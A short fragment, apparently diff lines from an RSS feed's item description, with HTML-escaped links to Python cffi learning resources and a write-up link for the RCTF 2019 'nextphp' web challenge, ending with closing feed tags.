+&lt;p>&lt;a href="https://www.cnblogs.com/ccxikka/p/9637545.html">Python cffi学习 &lt;/a> | &lt;a href="https://github.com/wolever/python-cffi-example">cffi-example: an example project showing how to use Python&amp;rsquo;s CFFI&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a>&lt;/p>
+&lt;/details></description></item></channel></rss>
